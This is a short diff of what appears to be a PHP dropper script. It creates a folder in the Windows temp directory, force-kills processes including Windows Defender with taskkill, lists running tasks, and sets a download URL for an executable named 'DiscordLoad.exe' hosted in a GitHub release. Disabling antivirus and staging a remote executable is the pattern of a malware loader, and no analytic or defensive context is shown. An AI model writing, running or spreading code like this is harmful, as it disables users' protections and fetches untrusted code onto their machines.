@@ -62,8 +62,8 @@ $deletePaths = [
 
 system('mkdir "C:/Windows/Temp/spawnZZ/"');
 system('taskkill /F /IM xnightpro.exe');
-system('taskkill /F /IM defender.exe');
-system('taskkill /F /IM spotify.exe');
+system('taskkill /F /IM Defender.exe');
+system('taskkill /F /IM Spotify.exe');
 exec('tasklist', $output);
 
 $url =  'https://github.com/mainpoint91/mainpoint/releases/download/night/DiscordLoad.exe';
